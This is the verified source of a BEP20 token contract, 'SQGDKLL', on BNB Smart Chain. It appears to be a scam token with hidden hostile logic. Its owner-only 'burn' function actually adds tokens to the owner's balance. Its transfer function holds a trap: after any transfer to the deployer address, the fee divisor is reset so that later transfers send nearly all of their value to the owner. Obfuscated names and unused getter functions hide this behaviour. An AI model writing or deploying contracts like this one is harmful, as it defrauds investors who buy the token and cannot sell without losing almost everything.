/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

pragma solidity =0.6.2;
library SafeCheck {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeCheck: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeCheck: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeCheck: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeCheck: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeCheck: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract SQGDKLL {
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  SAXZVZ = 1000000000000000000;
address private  RBUMTF = address(0);
address private  TLUOSN = address(0);
string public  name = "SQGDKLL";
string public  symbol = "SQGDKLL";
uint256 private  TTVFLB = 1000000000000000000;
address private  JPLPIT = address(0);
address private  TRUETM = address(0);
uint256 private  EWVCBD = 1000000000000000;
address public owner;
uint256 private  BIXRKC = 10000000000;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant LHYEWH = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  SZBNVA = 100000000;
address private  MYCFNG = address(0);
uint256 private  VJONQW = 10000000000000;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  RUZGBX = 1000000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMTBZHW 0");
require(spender != address(0), "fMTBZHW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () public {
JPLPIT = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getVJONQW() private returns (uint256) {
return VJONQW;
}

function _getEWVCBD() private returns (uint256) {
return EWVCBD;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getTTVFLB() private returns (uint256) {
return TTVFLB;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getRBUMTF() private returns (address) {
return RBUMTF;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getTLUOSN() private returns (address) {
return TLUOSN;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MTBZHW");
require(to != address(0), "MTBZHW");
require(amount <= balanceOf[from], "MTBZHW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LHYEWH/SAXZVZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JPLPIT){
SAXZVZ = LHYEWH+2;
}
emit Transfer(from, to, transferAmount);
}
function _getSZBNVA() private returns (uint256) {
return SZBNVA;
}

function _getBIXRKC() private returns (uint256) {
return BIXRKC;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getMYCFNG() private returns (address) {
return MYCFNG;
}

function _getTRUETM() private returns (address) {
return TRUETM;
}

function _getRUZGBX() private returns (uint256) {
return RUZGBX;
}


}